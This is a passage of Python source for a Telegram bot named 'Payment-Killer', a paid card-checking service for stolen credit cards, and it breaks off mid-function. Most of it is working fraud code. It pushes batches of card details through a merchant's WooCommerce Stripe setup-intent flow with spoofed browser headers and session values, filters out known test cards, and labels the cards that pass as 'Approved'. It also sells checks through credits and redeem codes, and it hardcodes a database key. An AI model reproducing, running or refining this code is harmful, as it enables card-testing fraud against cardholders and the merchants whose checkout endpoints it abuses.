import requests
import time
from colorama import Fore
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.constants import ChatAction
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telegram.helpers import escape_markdown
from telegram.error import Forbidden
import os
import re
import random
import string
import json
from supabase import create_client, Client
from bs4 import BeautifulSoup
import aiohttp
import asyncio

SUPABASE_URL = "https://xtlvcjxrqbhrpgxdyrvi.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh0bHZjanhycWJocnBneGR5cnZpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTI1NzAxNzAsImV4cCI6MjA2ODE0NjE3MH0.Qe6aONWmlvdrYaEV09WlA_GsPMS-xxGboD_aqGrYHF0"
SUPABASE_REDEEM_TABLE = "redeem_codes"
SUPABASE_USER_CREDITS_TABLE = "user_credits"
SUPABASE_BOT_SETTINGS_TABLE = "bot_settings"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

OWNER_IDS = [7500717662, 6937568471]

GENERATE_AMOUNT = 1
GENERATE_CREDITS = 2

DOMAIN = None
PK = None


def normalize_domain_url(url: str) -> str:
    """
    Normalizes a domain URL to always start with 'https://' and end with '/'.
    Examples:
    dainte.com -> https://dainte.com/
    www.dainte.com -> https://dainte.com/
    https://dainte.com -> https://dainte.com/
    https://dainte.com/ -> https://dainte.com/
    """
    url = re.sub(r'^(http:\/\/|https:\/\/)?(www\.)?',
                 '',
                 url,
                 flags=re.IGNORECASE)

    if not url.startswith('https://'):
        url = 'https://' + url

    if not url.endswith('/'):
        url += '/'
    return url


async def load_bot_settings_from_supabase():
    global DOMAIN, PK
    try:
        response = supabase.from_(SUPABASE_BOT_SETTINGS_TABLE).select(
            "setting_name, setting_value").execute()
        if response.data:
            settings = {
                item['setting_name']: item['setting_value']
                for item in response.data
            }
            DOMAIN = settings.get('DOMAIN')
            PK = settings.get('PK')
            print("\033[1;94m Bot is running... \033[0m")
            return True
        print("No bot settings found in Supabase.")
        return False
    except Exception as e:
        print(
            f"CRITICAL ERROR: Failed to load bot settings from Supabase: {e}")
        return False


async def update_bot_setting_in_supabase(setting_name: str,
                                         setting_value: str):
    try:

        if setting_name == 'DOMAIN':
            setting_value = normalize_domain_url(setting_value)

        response = supabase.from_(SUPABASE_BOT_SETTINGS_TABLE).upsert(
            {
                "setting_name": setting_name,
                "setting_value": setting_value
            },
            on_conflict="setting_name").execute()
        if response.data and len(response.data) > 0:
            return True
        return False
    except Exception as e:
        print(
            f"CRITICAL ERROR: Supabase update bot setting {setting_name} failed: {e}"
        )
        return False


async def get_user_credits_from_supabase(user_id: int) -> int:
    try:
        response = supabase.from_(SUPABASE_USER_CREDITS_TABLE).select(
            "credits").eq("user_id", user_id).execute()
        if response.data:
            return response.data[0]['credits']
        return 0
    except Exception as e:
        print(
            f"CRITICAL ERROR: Supabase fetch user {user_id} credits failed: {e}"
        )
        return 0


async def update_user_credits_in_supabase(user_id: int, new_credits: int):
    try:
        response = supabase.from_(SUPABASE_USER_CREDITS_TABLE).update({
            "credits":
            new_credits
        }).eq("user_id", user_id).execute()

        if response.data and len(response.data) > 0:
            return True
        else:
            return await create_user_credits_in_supabase(user_id, new_credits)
    except Exception as e:
        if "duplicate key value violates unique constraint" in str(e):
            return True
        print(
            f"CRITICAL ERROR: Supabase update user {user_id} credits failed: {e}"
        )
        return False


async def create_user_credits_in_supabase(user_id: int, initial_credits: int):
    try:
        data = {"user_id": user_id, "credits": initial_credits}
        response = supabase.from_(SUPABASE_USER_CREDITS_TABLE).insert(
            data).execute()
        if response.data and len(response.data) > 0:
            return True
        return False
    except Exception as e:
        if "duplicate key value violates unique constraint" in str(e):
            return True
        print(
            f"CRITICAL ERROR: Supabase create user {user_id} credits failed: {e}"
        )
        return False


async def reset_all_user_credits_to_zero_in_supabase():
    try:
        response = supabase.from_(SUPABASE_USER_CREDITS_TABLE).update({
            "credits":
            0
        }).gt("credits", -1).execute()

        if hasattr(response, 'error') and response.error:
            print(
                f"CRITICAL ERROR: Supabase reset all user credits returned an explicit error: {response.error.message}"
            )
            return False

        return True
    except Exception as e:
        print(
            f"CRITICAL ERROR: Failed to reset all user credits in Supabase: {e}"
        )
        return False


async def load_redeem_code_from_supabase(code):
    try:
        response = supabase.from_(SUPABASE_REDEEM_TABLE).select("credits").eq(
            "code", code).execute()
        if response.data:
            return response.data[0]['credits']
        return None
    except Exception as e:
        return None


async def add_redeem_code_to_supabase(code, credits):
    try:
        data = {"code": code, "credits": credits}
        response = supabase.from_(SUPABASE_REDEEM_TABLE).insert(data).execute()
        if response.data and len(response.data) > 0:
            return True
        return False
    except Exception as e:
        print(f"CRITICAL ERROR: Supabase add redeem code {code} failed: {e}")
        return False


async def delete_redeem_code_from_supabase(code):
    try:
        response = supabase.from_(SUPABASE_REDEEM_TABLE).delete().eq(
            "code", code).execute()
        if response.data and len(response.data) > 0:
            return True
        return False
    except Exception as e:
        print(
            f"CRITICAL ERROR: Supabase delete redeem code {code} failed: {e}")
        return False


def generate_unique_code(length=7):
    characters = string.ascii_uppercase + string.digits
    return "PK" + ''.join(random.choice(characters) for i in range(length - 2))


def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"


async def make_async_request(
    session,
    url,
    method="POST",
    params=None,
    headers=None,
    data=None,
    json=None,
):
    async with session.request(
            method,
            url,
            params=params,
            headers=headers,
            data=data,
            json=json,
    ) as response:
        return await response.text()


async def check_card(card_info):
    global DOMAIN, PK

    if not DOMAIN or not PK:
        print("DOMAIN or PK not loaded. Attempting to load now.")
        await load_bot_settings_from_supabase()
        if not DOMAIN or not PK:
            return "Declined", card_info, "Bot settings (DOMAIN/PK) not configured.", None

    try:
        normalized_card_info = card_info.replace('/', '|')
        cc, mon, year, cvv = normalized_card_info.split("|")
        year = year[-2:]

        test_card_patterns = [
            "4242424242424242",
            "4000000000000002",
            "4000000000000069",
            "4000000000000119",
            "4000000000000127",
            "5555555555554444",
            "5200828282828210",
            "378282246310005",
            "371449635398431",
            "6011111111111117",
            "30569309025904",
            "3566002020360505",
        ]

        if cc in test_card_patterns:
            return "Declined", card_info, "It's a test card 🧪", None

        async with aiohttp.ClientSession() as my_session:
            headers = {
                "accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language":
                "en-US,en;q=0.9",
                "cache-control":
                "max-age=0",
                "priority":
                "u=0, i",
                "referer":
                f"{DOMAIN}/my-account/payment-methods/",
                'sec-ch-ua':
                '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                'sec-ch-ua-mobile':
                '?0',
                'sec-ch-ua-platform':
                '"Windows"',
                'sec-fetch-dest':
                'empty',
                'sec-fetch-mode':
                'cors',
                'sec-fetch-site':
                'same-site',
                'user-agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }

            req = await make_async_request(
                my_session,
                url=f"{DOMAIN}/my-account/add-payment-method/",
                method="GET",
                headers=headers,
            )
            await asyncio.sleep(0.1)
            nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')
            if nonce == "None":
                nonce = '084e394fa5'

            headers2 = {
                'accept':
                'application/json',
                'accept-language':
                'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control':
                'no-cache',
                'content-type':
                'application/x-www-form-urlencoded',
                'origin':
                'https://js.stripe.com',
                'pragma':
                'no-cache',
                'priority':
                'u=1, i',
                'referer':
                'https://js.stripe.com/',
                'sec-ch-ua':
                '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                'sec-ch-ua-mobile':
                '?0',
                'sec-ch-ua-platform':
                '"Windows"',
                'sec-fetch-dest':
                'empty',
                'sec-fetch-mode':
                'cors',
                'sec-fetch-site':
                'same-site',
                'user-agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }

            data2 = {
                "type": "card",
                "card[number]": f"{cc}",
                "card[cvc]": f"{cvv}",
                "card[exp_year]": f"20{year}",
                "card[exp_month]": f"{mon}",
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'BD',
                'pasted_fields': 'number',
                'payment_user_agent':
                'stripe.js/7eb76afb12; stripe-js-v3/7eb76afb12; payment-element; deferred-intent',
                'referrer': DOMAIN,
                'time_on_page': '999999',
                'client_attribution_metadata[client_session_id]':
                'd8da6475-6b4f-4df7-b6dc-d829b95ef23b',
                'client_attribution_metadata[merchant_integration_source]':
                'elements',
                'client_attribution_metadata[merchant_integration_subtype]':
                'payment-element',
                'client_attribution_metadata[merchant_integration_version]':
                '2021',
                'client_attribution_metadata[payment_intent_creation_flow]':
                'deferred',
                'client_attribution_metadata[payment_method_selection_flow]':
                'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]':
                '418b5740-02fd-4657-bec0-d8cc92b17a8b',
                'guid': 'cd452db8-b653-426c-a9bb-008cc8f51378eedf1e',
                'muid': 'e9528f44-94ec-4cea-9125-432eac121ca9867ccc',
                'sid': '5cc00089-78f2-4b14-97ad-044b66595e59d9c714',
                'key': PK,
                "_stripe_version": "2024-06-20",
            }

            req2_text = await make_async_request(
                my_session,
                f"https://api.stripe.com/v1/payment_methods",
                headers=headers2,
                data=data2,
            )
            await asyncio.sleep(0.1)

            try:
                stripe_pm_json = json.loads(req2_text)
            except json.JSONDecodeError:
                return "Declined", card_info, f"Stripe PM Creation Failed: Invalid JSON response: {req2_text}", None

            if stripe_pm_json.get('id') and stripe_pm_json.get(
                    'type') == 'card':
                pmid = stripe_pm_json['id']
            else:
                error_message = stripe_pm_json.get('error', {}).get(
                    'message', 'Unknown error during PM creation')
                return "Declined", card_info, f"Stripe PM Creation Failed: {error_message}", stripe_pm_json

            headers3 = {
                "accept":
                "*/*",
                "accept-language":
                "en-US,en;q=0.9",
                "content-type":
                "application/x-www-form-urlencoded; charset=UTF-8",
                "origin":
                DOMAIN,
                "priority":
                "u=1, i",
                "referer":
                f"{DOMAIN}/my-account/add-payment-method/",
                'sec-ch-ua':
                '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                'sec-ch-ua-mobile':
                '?0',
                'sec-ch-ua-platform':
                '"Windows"',
                'sec-fetch-dest':
                'empty',
                'sec-fetch-mode':
                'cors',
                'sec-fetch-site':
                'same-site',
                'user-agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            data3 = {
                "action": "create_and_confirm_setup_intent",
                "wc-stripe-payment-method": pmid,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": nonce,
            }
            req4_text = await make_async_request(
                my_session,
                url=
                f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
                headers=headers3,
                data=data3,
            )
            await asyncio.sleep(0.1)

            try:
                response_json = json.loads(req4_text)
            except json.JSONDecodeError:
                return "Declined", card_info, f"Gateway Died (Invalid JSON Response from final check): {req4_text}", None

            # Condition 1 for Approved: {"success":true,"data":{"status":"succeeded"...}}
            if response_json.get('success') is True and \
               isinstance(response_json.get('data'), dict) and \
               response_json['data'].get('status') == "succeeded":
                return "Approved", card_info, "Succeeded", response_json

            # Condition 2 for Approved: {"success":false,"data":{"error":{"message":"Your card does not support this type of purchase."}}}
            elif response_json.get('success') is False and \
                 isinstance(response_json.get('data'), dict) and \
                 isinstance(response_json['data'].get('error'), dict) and \
                 response_json['data']['error'].get('message') == "Your card does not support this type of purchase.":
                return "Approved", card_info, "Card does not support this type of purchase.", response_json

            # All other conditions are Declined
            elif response_json.get('success') is False and \
                 isinstance(response_json.get('data'), dict) and \
                 isinstance(response_json['data'].get('error'), dict) and \
                 response_json['data']['error'].get('message'):
                return "Declined", card_info, response_json['data']['error'][
                    'message'], response_json
            else:
                return "Declined", card_info, f"Server Error: Unknown response from Eptes.com: {req4_text}", response_json

    except aiohttp.ClientError as e:
        error_details = str(e)
        return "Declined", card_info, f"Gateway Died (Network/HTTP Error): {error_details}", None
    except json.JSONDecodeError:
        return "Declined", card_info, "Gateway Died (Invalid JSON Response)", None
    except Exception as e:
        return "Declined", card_info, f"Gateway Died Unexpectedly: {str(e)[:100]}", None


main_keyboard = [[KeyboardButton("Profile"), KeyboardButton("Help")]]
reply_markup = ReplyKeyboardMarkup(main_keyboard,
                                   resize_keyboard=True,
                                   one_time_keyboard=False)


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                       action=ChatAction.TYPING)
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name if update.effective_user.first_name else "there"

    escaped_user_name = escape_markdown(user_name, version=2)

    try:
        response = supabase.from_(SUPABASE_USER_CREDITS_TABLE).select(
            "user_id").eq("user_id", user_id).execute()
        user_exists_in_db = bool(response.data)
    except Exception as e:
        print(
            f"CRITICAL ERROR: Supabase error checking user existence for {user_id}: {e}. Assuming user does not exist."
        )
        user_exists_in_db = False

    if not user_exists_in_db:
        success_create = await create_user_credits_in_supabase(user_id, 0)
        if not success_create:
            print(
                f"CRITICAL ERROR: Failed to CREATE user {user_id} during start_command."
            )
            pass

    global DOMAIN, PK
    if not DOMAIN or not PK:
        await load_bot_settings_from_supabase()

    await update.message.reply_text(
        f"Hello *{escaped_user_name}*\\! Welcome to the *Payment\\-Killer* Bot\\. Let's check a card\\.",
        reply_markup=reply_markup,
        parse_mode='MarkdownV2')


async def help_command(update: Update, Context: ContextTypes.DEFAULT_TYPE):
    await Context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                       action=ChatAction.TYPING)
    await update.message.reply_text(
        "*How to use PaymentKillerBot:*\n\n"
        "💳 *1\\. Checking Cards:*\n"
        "Send card details in the format: `CARD_NUMBER|MM|YY|CVC` or `CARD_NUMBER/MM/YYYY/CVC`\\.\n"
        "   *Example:*\n"
        "   `44242424242424242|03|33|333`\n"
        "You can send *multiple cards* by placing each on a new line for batch processing\\.\n\n"
        "💰 *2\\. Redeeming Credits:*\n"
        "To redeem a credit code, simply send the code directly in the chat\\. All valid redeem codes start with `PK`\\.\n\n"
        "👤 *3\\. Your Profile:*\n"
        "Tap the *'Profile'* button to view your current credit balance and Telegram account information\\.\n\n"
        "⚙️ *Important Notes:*\n"
        "\\Ensure your card details are *always* in the correct format for accurate checks\\.\n"
        "\\For any issues or support, contact the developer: *@notnafiz*",
        parse_mode='MarkdownV2')


async def multiple_check_command(update: Update,
                                 context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                       action=ChatAction.TYPING)
    await update.message.reply_text(
        "Please send multiple card details, each on a new line (N|MM|YY|CVC):\n"
        "Example:\n"
        "*44242424242424242|03|33|333*\n",
        parse_mode='MarkdownV2')


async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                       action=ChatAction.TYPING)
    user_id = update.effective_user.id
    credits = await get_user_credits_from_supabase(user_id)
    await update.message.reply_text(
        f"You currently have *{escape_markdown(str(credits), version=2)}* credit\\(s\\)\\.",
        parse_mode='MarkdownV2')


async def profile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                       action=ChatAction.TYPING)
    user = update.effective_user
    user_id = user.id
    credits = await get_user_credits_from_supabase(user_id)

    full_name = f"{user.first_name}"
    if user.last_name:
        full_name += f" {user.last_name}"

    escaped_full_name = escape_markdown(full_name, version=2)
    escaped_username_display = escape_markdown(
        f"@{user.username}" if user.username else "N/A", version=2)
    escaped_credits = escape_markdown(str(credits), version=2)

    if user:
        await update.message.reply_text(
            f"👤 *Your Profile Details:*\n"
            f"   \\ *Name:* {escaped_full_name}\n"
            f"   \\ *Telegram ID:* `{user.id}`\n"
            f"   \\ *Username:* {escaped_username_display}\n"
            f"   \\ *Current Credits:* *{escaped_credits}*",
            parse_mode='MarkdownV2')
    else:
        await update.message.reply_text(escape_markdown(
            "Could not retrieve your profile information\\. Please try again\\.",
            version=2),
                                        parse_mode='MarkdownV2')


async def add_pk_domain_command(update: Update,
                                context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_IDS:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                           action=ChatAction.TYPING)
        await update.message.reply_text(escape_markdown(
            "You are not authorized to use this command\\.", version=2),
                                        parse_mode='MarkdownV2')
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                           action=ChatAction.TYPING)
        await update.message.reply_text(escape_markdown(
            "Usage: /add <PK_KEY> <DOMAIN_URL>", version=2),
                                        parse_mode='MarkdownV2')
        return

    new_pk = args[0]
    raw_new_domain = args[1]

    new_domain = normalize_domain_url(raw_new_domain)

    pk_success = await update_bot_setting_in_supabase("PK", new_pk)
    domain_success = await update_bot_setting_in_supabase("DOMAIN", new_domain)

    if pk_success and domain_success:
        global PK, DOMAIN
        PK = new_pk
        DOMAIN = new_domain
        await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                           action=ChatAction.TYPING)
        await update.message.reply_text(escape_markdown(
            f"✅ PK and DOMAIN updated successfully ", version=2),
                                        parse_mode='MarkdownV2')
    else:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                           action=ChatAction.TYPING)
        await update.message.reply_text(escape_markdown(
            "❌ Failed to update PK or DOMAIN. Please check logs.", version=2),
                                        parse_mode='MarkdownV2')


async def generate_redeem_start(update: Update,
                                context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_IDS:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                           action=ChatAction.TYPING)
        await update.message.reply_text(escape_markdown(
            "You are not authorized to use this command\\.", version=2),
                                        parse_mode='MarkdownV2')
        return ConversationHandler.END

    await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                       action=ChatAction.TYPING)
    await update.message.reply_text(escape_markdown(
        "How many codes to generate?", version=2),
                                    parse_mode='MarkdownV2')
    return GENERATE_AMOUNT


async def get_redeem_amount(update: Update,
                            context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                       action=ChatAction.TYPING)
    try:
        num_codes = int(update.message.text.strip())
        if num_codes <= 0:
            await update.message.reply_text(escape_markdown(
                "Please enter a positive number\\. How many codes to generate?",
                version=2),
                                            parse_mode='MarkdownV2')
            return GENERATE_AMOUNT
        context.user_data['num_codes_to_generate'] = num_codes
        await update.message.reply_text(escape_markdown("Credits per code?",
                                                        version=2),
                                        parse_mode='MarkdownV2')
        return GENERATE_CREDITS
    except ValueError:
        await update.message.reply_text(escape_markdown(
            "Invalid input\\. Please enter a number for the amount of codes\\.",
            version=2),
                                        parse_mode='MarkdownV2')
        return ConversationHandler.END


async def get_redeem_credits(update: Update,
                             context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                       action=ChatAction.TYPING)
    try:
        credits_per_code = int(update.message.text.strip())
        if credits_per_code <= 0:
            await update.message.reply_text(escape_markdown(
                "Please enter a positive number\\. How many credits will each code contain?",
                version=2),
                                            parse_mode='MarkdownV2')
            return GENERATE_CREDITS

        num_codes = context.user_data['num_codes_to_generate']

        header_message_part = escape_markdown(
            "Here are your generated redeem codes:", version=2)
        generated_codes_list = []

        for _ in range(num_codes):
            unique_code = generate_unique_code(length=7)
            success = await add_redeem_code_to_supabase(
                unique_code, credits_per_code)
            if success:
                generated_codes_list.append(f"`{unique_code}`")
            else:
                generated_codes_list.append(
                    escape_markdown(
                        f"Failed to generate and save code for {unique_code}",
                        version=2))

        final_message = f"{header_message_part}\n" + "\n".join(
            generated_codes_list)

        try:
            await update.message.reply_text(final_message,
                                            parse_mode='MarkdownV2')
        except Exception as e:
            print(
                f"ERROR: Failed to send generated redeem codes message. Raw message: {final_message}. Error: {e}"
            )
            await update.message.reply_text(escape_markdown(
                "An error occurred while sending the codes\\. Please check console for details\\.",
                version=2),
                                            parse_mode='MarkdownV2')

        context.user_data.clear()
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text(escape_markdown(
            "Invalid input\\. Please enter a number for the credits per code\\.",
            version=2),
                                        parse_mode='MarkdownV2')
        return ConversationHandler.END


async def cancel_generation(update: Update,
                            context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                       action=ChatAction.TYPING)
    await update.message.reply_text(escape_markdown(
        "Redeem code generation cancelled\\.", version=2),
                                    reply_markup=reply_markup,
                                    parse_mode='MarkdownV2')
    context.user_data.clear()
    return ConversationHandler.END


async def nocredit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_IDS:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                           action=ChatAction.TYPING)
        await update.message.reply_text(escape_markdown(
            "You are not authorized to use this command\\.", version=2),
                                        parse_mode='MarkdownV2')
        return

    await context.bot.send_chat_action(chat_id=update.effective_chat.id,
                                       action=ChatAction.TYPING)
    success = await reset_all_user_credits_to_zero_in_supabase()
    if success:
        message_text = escape_markdown(
            "✅ All user credits have been reset to zero!", version=2)
        await update.message.reply_text(f"*{message_text}*",
                                        parse_mode='MarkdownV2')
    else:
        print(
            f"CRITICAL ERROR: Failed to reset all user credits. Check console for errors or verify Supabase RLS policy."
        )
        await update.message.reply_text(escape_markdown(
            "Failed to reset all user credits\\. Check console for errors or verify Supabase RLS policy\\.",
            version=2),
                                        parse_mode='MarkdownV2')


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if user_input == "Profile":
        await profile_command(update, context)
        return
    elif user_input == "Help":
        await help_command(update, context)
        return

    global DOMAIN, PK
    if not DOMAIN or not PK:
        await load_bot_settings_from_supabase()
        if not DOMAIN or not PK:
            await context.bot.send_chat_action(chat_id=chat_id,
                                               action=ChatAction.TYPING)
            await update.message.reply_text(escape_markdown(
                "Bot settings (PK/DOMAIN) are not loaded. Please contact an admin.",
                version=2),
                                            parse_mode='MarkdownV2')
            return

    if context.chat_data.get('is_checking_cards', False):
        try:
            await context.bot.send_chat_action(chat_id=chat_id,
                                               action=ChatAction.TYPING)
            await update.message.reply_text(
                f"*{escape_markdown('I am currently checking other cards. Please wait until the current process is finished. Try again later.', version=2)}*",
                parse_mode='MarkdownV2')
        except Forbidden:
            print(
                f"WARNING: Bot was blocked by user {user_id}. Cannot send concurrent message warning."
            )
        return

    input_lines = [
        line.strip() for line in user_input.split('\n') if line.strip()
    ]

    potential_card_inputs = []
    card_regex = r'\d{13,19}[|/]\d{1,2}[|/]\d{2,4}[|/]\d{3,4}'

    if input_lines:
        all_lines_are_cards = True
        for line in input_lines:
            if not re.fullmatch(card_regex, line):
                all_lines_are_cards = False
                break
            potential_card_inputs.append(line)

        if all_lines_are_cards:
            if len(potential_card_inputs) > 100:
                try:
                    await context.bot.send_chat_action(
                        chat_id=chat_id, action=ChatAction.TYPING)
                    await update.message.reply_text(
                        f"You can only check a *{escape_markdown('maximum of 100 cards', version=2)}* at once\\. Please send fewer cards\\.",
                        parse_mode='MarkdownV2')
                except Forbidden:
                    print(
                        f"WARNING: Bot was blocked by user {user_id}. Cannot send max cards warning."
                    )
                return

            context.chat_data['is_checking_cards'] = True
            try:
                current_credits = await get_user_credits_from_supabase(user_id)

                user_exists_check_response = supabase.from_(
                    SUPABASE_USER_CREDITS_TABLE).select("user_id").eq(
                        "user_id", user_id).execute()
                if not user_exists_check_response.data:
                    await create_user_credits_in_supabase(user_id, 0)
                    current_credits = 0

                is_owner = user_id in OWNER_IDS

                if not is_owner and current_credits < len(
                        potential_card_inputs):
                    try:
                        await context.bot.send_chat_action(
                            chat_id=chat_id, action=ChatAction.TYPING)
                        await update.message.reply_text(
                            f"❌ *{escape_markdown('You do not have enough credits', version=2)}*\n\n⚠️ *{escape_markdown('Please add more credits to continue', version=2)}*",
                            reply_markup=reply_markup,
                            parse_mode='MarkdownV2')
                    except Forbidden:
                        print(
                            f"WARNING: Bot was blocked by user {user_id}. Cannot send insufficient credits warning."
                        )
                    return

                for card_info in potential_card_inputs:
                    try:
                        await context.bot.send_chat_action(
                            chat_id=chat_id, action=ChatAction.TYPING)
                    except Forbidden:
                        print(
                            f"WARNING: Bot was blocked by user {user_id}. Cannot send typing action."
                        )
                        break

                    if is_owner or (current_credits >= 1):
                        checking_message_text = f"Checking card: `{escape_markdown(card_info, version=2)}`"
                        checking_message = None
                        try:
                            checking_message = await update.message.reply_text(
                                checking_message_text, parse_mode='MarkdownV2')
                        except Forbidden:
                            print(
                                f"WARNING: Bot was blocked by user {user_id}. Cannot send 'Checking card' message."
                            )
                            break
                        except Exception as e:
                            print(
                                f"ERROR: Failed to send 'Checking card' message for {card_info[:4]}.... Error: {e}"
                            )
                            try:
                                await update.message.reply_text(escape_markdown(
                                    f"An error occurred while preparing to check card {card_info[:4]}.... Please try again\\.",
                                    version=2),
                                                                parse_mode=
                                                                'MarkdownV2')
                            except Forbidden:
                                print(
                                    f"WARNING: Bot was blocked by user {user_id}. Cannot send error message."
                                )
                            continue

                        start_time = time.time()
                        status_type, original_card_info, reason, full_response_json = await check_card(
                            card_info)
                        end_time = time.time()
                        delay = round(end_time - start_time, 2)

                        result_message = ""
                        if status_type == "Approved":
                            escaped_card_info = escape_markdown(
                                original_card_info, version=2)
                            escaped_delay = escape_markdown(str(delay),
                                                            version=2)
                            escaped_bot_name = escape_markdown(
                                'PaymentKillerBot', version=2)

                            result_message = (
                                f"Card: `{escaped_card_info}`\n"
                                f"Status: *{escape_markdown('Approved ✅', version=2)}*\n"
                                f"Gateway: *{escape_markdown('Stripe Auth', version=2)}*\n"
                                f"Delay : *{escaped_delay}s*\n"
                                f"Checked on: [{escaped_bot_name}](https://t.me/PaymentKillerBot)"
                            )
                            if current_credits > 0:
                                current_credits -= 1
                                success_deduct = await update_user_credits_in_supabase(
                                    user_id, current_credits)
                                if not success_deduct:
                                    try:
                                        await update.message.reply_text(
                                            f"*{escape_markdown('Error deducting credit from database. Please contact support.', version=2)}*",
                                            parse_mode='MarkdownV2')
                                    except Forbidden:
                                        print(
                                            f"WARNING: Bot was blocked by user {user_id}. Cannot send credit deduction error."
                                        )
                                    break

                        elif status_type == "Declined":
                            escaped_card_info = escape_markdown(
                                original_card_info, version=2)
                            result_message = (
                                f"**CC: `{escaped_card_info}`**\n"
                                f"Status: *{escape_markdown('Declined ❌', version=2)}*\n"
                            )
                            if current_credits > 0:
                                current_credits -= 1
                                success_deduct = await update_user_credits_in_supabase(
                                    user_id, current_credits)
                                if not success_deduct:
                                    try:
                                        await update.message.reply_text(
                                            f"*{escape_markdown('Error deducting credit from database. Please contact support.', version=2)}*",
                                            parse_mode='MarkdownV2')
                                    except Forbidden:
                                        print(
                                            f"WARNING: Bot was blocked by user {user_id}. Cannot send credit deduction error."
                                        )
                                    break

                        if checking_message:
                            try:
                                await checking_message.edit_text(
                                    result_message, parse_mode='MarkdownV2')
                            except Forbidden:
                                print(
                                    f"WARNING: Bot was blocked by user {user_id}. Cannot edit status message. Trying to send new message."
                                )
                                try:
                                    await update.message.reply_text(
                                        result_message,
                                        parse_mode='MarkdownV2')
                                except Forbidden:
                                    print(
                                        f"WARNING: Bot was blocked by user {user_id}. Cannot send new status message either."
                                    )
                                break
                            except Exception as e:
                                print(
                                    f"ERROR: Failed to EDIT 'Checking card' message. Raw message: {result_message}. Error: {e}"
                                )
                                try:
                                    await update.message.reply_text(
                                        escape_markdown(
                                            "Failed to update status message\\. See below for result\\.",
                                            version=2),
                                        parse_mode='MarkdownV2')
                                    await update.message.reply_text(
                                        result_message,
                                        parse_mode='MarkdownV2')
                                except Forbidden:
                                    print(
                                        f"WARNING: Bot was blocked by user {user_id}. Cannot send fallback error messages."
                                    )
                                break
                        else:
                            try:
                                await update.message.reply_text(
                                    result_message, parse_mode='MarkdownV2')
                            except Forbidden:
                                print(
                                    f"WARNING: Bot was blocked by user {user_id}. Cannot send result message."
                                )
                                break
                    else:
                        try:
                            await context.bot.send_chat_action(
                                chat_id=chat_id, action=ChatAction.TYPING)
                            await update.message.reply_text(
                                f"❌ *{escape_markdown('You do not have enough credits', version=2)}*\n\n⚠️ *{escape_markdown('Please add more credits to continue', version=2)}*",
                                reply_markup=reply_markup,
                                parse_mode='MarkdownV2')
                        except Forbidden:
                            print(
                                f"WARNING: Bot was blocked by user {user_id}. Cannot send insufficient credits message."
                            )
                        return
            finally:
                context.chat_data['is_checking_cards'] = False
            return

    if len(input_lines) == 1:
        redeem_match = re.fullmatch(r"PK[0-9A-Z]{5}", input_lines[0])
        if redeem_match:
            try:
                await context.bot.send_chat_action(chat_id=chat_id,
                                                   action=ChatAction.TYPING)
            except Forbidden:
                print(
                    f"WARNING: Bot was blocked by user {user_id}. Cannot send typing action for redeem."
                )
                return

            code = input_lines[0]
            credits_to_add = await load_redeem_code_from_supabase(code)

            if credits_to_add is not None:
                current_credits = await get_user_credits_from_supabase(user_id)

                success_update_or_create = await update_user_credits_in_supabase(
                    user_id, current_credits + credits_to_add)

                if not success_update_or_create:
                    try:
